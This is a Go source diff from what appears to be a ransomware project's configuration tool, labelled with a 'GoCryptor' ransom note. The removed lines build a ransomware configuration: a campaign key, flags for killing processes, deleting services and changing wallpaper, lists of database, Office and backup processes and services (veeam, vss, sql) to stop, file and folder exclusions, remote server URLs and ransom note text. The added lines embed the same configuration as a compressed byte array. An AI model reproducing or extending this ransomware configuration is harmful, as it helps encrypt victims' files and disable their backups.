@@ -8,74 +8,17 @@ import (
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
-	populateConfig()
-}
-
-func populateConfig() {
-	config := Configuration{}
-
-	version := []int{1, 0}
-	config.setVersion(version)
-
-	campaignKey := [32]byte{121, 255, 160, 49, 104, 254, 213, 18, 97, 27, 75, 192, 146, 104, 251, 41, 37, 72, 43, 246, 200, 134, 120, 74, 61, 175, 222, 154, 182, 134, 224, 94}
-	config.setCampaignKey(campaignKey)
-
-	largeFileEncryptFlag := false
-	privilegeEscalationFlag := false
-	networkEncryptFlag := false
-	terminateProcessFlag := true
-	deleteServiceFlag := true
-	wallpaperFlag := true
-	runOnceFlag := true
-	serverCommunicationFlag := false
-	config.setFlags([]bool{largeFileEncryptFlag, privilegeEscalationFlag, networkEncryptFlag,
-		terminateProcessFlag, deleteServiceFlag, wallpaperFlag, runOnceFlag, serverCommunicationFlag})
-
-	processHashList := stringListToHashList([]string{"thebat", "msaccess", "firefox", "notepad", "ocssd", "encsvc", "dbeng50", "sql", "agntsvc", "isqlplussvc", "xfssvccon", "tbirdconfig", "wordpad", "dbsnmp", "infopath", "powerpnt", "oracle", "ocautoupds", "visio", "excel", "winword", "synctime", "steam", "thunderbird", "sqbcoreservice", "mspub", "ocomm", "onenote", "mydesktopqos", "mydesktopservice", "outlook"})
-	config.setProcessHashList(processHashList)
-
-	serviceHashList := stringListToHashList([]string{"mepocs", "memtas", "veeam", "svc$", "backup", "sql", "vss", "msexchange"})
-	config.setServiceHashList(serviceHashList)
-
-	remoteServerURLList := [][]byte{[]byte("https://chuongdong.com"), []byte("http://chuongdong.com")}
-	config.setRemoteServerURLList(remoteServerURLList)
-
-	ransomNoteContent, err := compress([]byte("   _____        _____                  _             \n  / ____|      / ____|                | |            \n | |  __  ___ | |     _ __ _   _ _ __ | |_ ___  _ __ \n | | |_ |/ _ \\| |    | '__| | | | '_ \\| __/ _ \\| '__|\n | |__| | (_) | |____| |  | |_| | |_) | || (_) | |   \n  \\_____|\\___/ \\_____|_|   \\__, | .__/ \\__\\___/|_|   \n                            __/ | |                  \n                           |___/|_|                  --> Your ID: %s\n--> Your key: %x\n"))
+	// populateConfig()
+	config, err := decompress(compressedConfig)
 
 	if err != nil {
-		fmt.Println("Can't compress", err.Error())
-		ransomNoteContent = []byte("   _____        _____                  _             \n  / ____|      / ____|                | |            \n | |  __  ___ | |     _ __ _   _ _ __ | |_ ___  _ __ \n | | |_ |/ _ \\| |    | '__| | | | '_ \\| __/ _ \\| '__|\n | |__| | (_) | |____| |  | |_| | |_) | || (_) | |   \n  \\_____|\\___/ \\_____|_|   \\__, | .__/ \\__\\___/|_|   \n                            __/ | |                  \n                           |___/|_|                  --> Your ID: %s\n--> Your key: %x\n")
+		println("Fail")
+		return
 	}
-	config.setRansomNoteContent(ransomNoteContent)
-	config.setRansomNoteContentHash(bufferHashing(config.ransomNoteContent))
-
-	runOnceString, err := compress([]byte("g0_l4nG_1S_FuN_i5nT_1T.lock"))
-	if err != nil {
-		fmt.Println("Can't compress", err.Error())
-		runOnceString = []byte("g0_l4nG_1S_FuN_i5nT_1T.lock")
-	}
-	config.setRunOnceString(runOnceString)
-
-	fileHashList := stringListToHashList([]string{"bootfont.bin", "thumbs.db", "ntldr", "ntuser.dat", "iconcache.db", "autorun.inf", "ntuser.ini", "bootsect.bak", "boot.ini", "ntuser.dat.log", "desktop.ini"})
-	config.setFileHashList(fileHashList)
-
-	folderHashList := stringListToHashList([]string{"program files (x86)", "$windows.~ws", "msocache", "boot", "program files", "application data", "tor browser", "mozilla", "intel", "programdata", "default", "appdata", "all users", "$windows.~bt", "google", "windows", "$recycle.bin", "windows.old", "config.msi", "public", "perflogs", "system volume information"})
-	config.setFolderHashList(folderHashList)
-
-	extensionHashList := stringListToHashList([]string{"cur", "diagcab", "cab", "idx", "diagcfg", "hlp", "theme", "rtp", "ldf", "msp", "mod", "drv", "lock", "ico", "lnk", "icns", "wpx", "shs", "icl", "msc", "diagpkg", "msu", "adv", "pdb", "mpa", "msstyles", "scr", "key", "dll", "nls", "cmd", "hta", "ocx", "sys", "ics", "ani", "cpl", "deskthemepack", "exe", "386", "themepack", "ps1", "nomedia", "com", "spl", "rom", "bat", "prf", "bin", "msi"})
-	config.setExtensionHashList(extensionHashList)
-
-	fmt.Println(config.toBytes())
+	fmt.Println(parseConfig(config))
 }
 
-func stringListToHashList(list []string) []uint32 {
-	result := []uint32{}
-
-	for _, each := range list {
-		result = append(result, bufferHashing([]byte(each)))
-	}
-	return result
-}
+var compressedConfig = []byte{4, 34, 77, 24, 100, 112, 185, 28, 3, 0, 0, 244, 27, 1, 0, 64, 99, 80, 101, 116, 101, 114, 114, 121, 255, 160, 49, 104, 254, 213, 18, 97, 27, 75, 192, 146, 104, 251, 41, 37, 72, 43, 246, 200, 134, 120, 74, 61, 175, 222, 154, 182, 134, 224, 94, 40, 0, 102, 0, 0, 0, 1, 1, 1, 56, 0, 248, 5, 197, 16, 32, 4, 0, 0, 0, 0, 72, 49, 52, 8, 0, 0, 0, 0, 6, 33, 40, 134, 8, 0, 132, 132, 0, 24, 2, 0, 0, 0, 0, 40, 0, 4, 32, 0, 72, 2, 0, 8, 0, 40, 0, 200, 108, 106, 88, 144, 0, 0, 0, 0, 169, 65, 64, 138, 16, 0, 4, 48, 0, 4, 64, 0, 4, 104, 0, 4, 8, 0, 4, 24, 0, 72, 11, 82, 76, 13, 112, 0, 4, 120, 0, 4, 64, 0, 4, 48, 0, 4, 24, 0, 4, 112, 0, 79, 161, 179, 128, 217, 56, 0, 9, 200, 206, 130, 100, 83, 0, 0, 0, 0, 133, 232, 156, 96, 176, 0, 4, 16, 1, 4, 128, 0, 4, 8, 0, 4, 96, 0, 72, 67, 0, 16, 0, 248, 0, 4, 240, 0, 4, 8, 0, 4, 176, 0, 4, 72, 0, 255, 15, 104, 116, 116, 112, 115, 58, 47, 47, 99, 104, 117, 111, 110, 103, 100, 111, 110, 103, 46, 99, 111, 109, 121, 101, 101, 116, 104, 116, 116, 112, 25, 0, 2, 4, 59, 0, 243, 34, 4, 34, 77, 24, 100, 112, 185, 17, 1, 0, 0, 147, 32, 32, 32, 95, 95, 95, 95, 95, 32, 1, 0, 9, 13, 0, 6, 2, 0, 21, 95, 10, 0, 226, 32, 32, 32, 32, 10, 32, 32, 47, 32, 95, 95, 95, 95, 124, 16, 27, 0, 244, 221, 35, 124, 32, 32, 0, 2, 2, 0, 226, 10, 32, 124, 32, 124, 32, 32, 95, 95, 32, 32, 95, 95, 95, 13, 0, 0, 127, 0, 82, 32, 95, 95, 32, 95, 9, 0, 18, 32, 24, 0, 83, 95, 32, 95, 95, 95, 26, 0, 2, 54, 0, 147, 124, 95, 32, 124, 47, 32, 95, 32, 92, 84, 0, 98, 124, 32, 39, 95, 95, 124, 27, 0, 147, 32, 39, 95, 32, 92, 124, 32, 95, 95, 33, 0, 242, 3, 39, 95, 95, 124, 10, 32, 124, 32, 124, 95, 95, 124, 32, 124, 32, 40, 95, 41, 13, 0, 2, 15, 0, 66, 32, 124, 32, 124, 58, 0, 2, 24, 0, 5, 33, 0, 2, 216, 0, 196, 92, 95, 95, 95, 95, 95, 124, 92, 95, 95, 95, 47, 13, 0, 211, 95, 124, 32, 32, 32, 92, 95, 95, 44, 32, 124, 32, 46, 24, 0, 115, 92, 95, 95, 95, 47, 124, 95, 54, 0, 15, 2, 0, 7, 67, 95, 95, 47, 32, 180, 0, 10, 2, 0, 25, 10, 14, 0, 10, 2, 0, 22, 124, 93, 0, 11, 2, 0, 240, 1, 45, 45, 62, 32, 89, 111, 117, 114, 32, 73, 68, 58, 32, 37, 115, 10, 16, 0, 208, 89, 111, 117, 114, 32, 107, 101, 121, 58, 32, 37, 120, 10, 0, 0, 0, 0, 96, 46, 30, 9, 231, 2, 72, 135, 146, 52, 146, 119, 1, 3, 60, 1, 244, 24, 27, 0, 0, 128, 103, 48, 95, 108, 52, 110, 71, 95, 49, 83, 95, 70, 117, 78, 95, 105, 53, 110, 84, 95, 49, 84, 46, 108, 111, 99, 107, 0, 0, 0, 0, 147, 19, 118, 38, 114, 1, 4, 21, 2, 4, 173, 2, 4, 245, 1, 4, 213, 1, 4, 32, 0, 4, 101, 2, 12, 24, 0, 4, 141, 2, 4, 125, 2, 4, 40, 0, 4, 210, 1, 72, 227, 61, 73, 11, 72, 0, 4, 48, 0, 4, 85, 2, 72, 48, 155, 114, 22, 149, 2, 4, 64, 0, 4, 237, 2, 4, 144, 0, 12, 24, 0, 4, 32, 0, 4, 184, 0, 4, 168, 0, 4, 189, 2, 4, 32, 0, 4, 24, 0, 4, 64, 0, 4, 192, 0, 4, 40, 0, 4, 144, 0, 72, 198, 114, 69, 162, 78, 1, 4, 221, 2, 4, 72, 0, 4, 16, 0, 4, 8, 0, 12, 24, 0, 4, 168, 0, 4, 32, 0, 15, 8, 0, 13, 4, 0, 1, 12, 40, 0, 15, 24, 0, 5, 12, 40, 0, 12, 128, 0, 12, 32, 0, 4, 16, 0, 4, 224, 0, 4, 16, 0, 15, 8, 0, 61, 4, 192, 1, 12, 88, 0, 4, 152, 1, 4, 24, 0, 15, 176, 0, 21, 4, 48, 0, 12, 8, 0, 0, 80, 2, 240, 5, 116, 101, 114, 114, 222, 28, 231, 100, 0, 0, 0, 0, 64, 99, 80, 101, 116, 101, 114, 114, 0, 0, 0, 0, 18, 222, 241, 227}
 
 // Things to do:
 // - Command line arguments
